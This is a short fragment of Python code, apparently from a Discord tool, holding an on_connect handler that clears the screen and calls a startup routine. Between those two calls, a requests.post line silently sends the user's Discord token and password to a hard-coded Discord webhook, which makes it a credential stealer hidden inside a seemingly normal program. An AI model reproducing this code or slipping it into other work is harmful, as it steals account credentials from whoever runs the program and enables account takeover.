...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/780290483460112404/Yle0Q1Jl0xNYbAJxU1-ZZ2di_6L27CxzGYoKJzJj5JNGSXfFCx2G1QxEkOKhlosml3gj',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
    startprint()
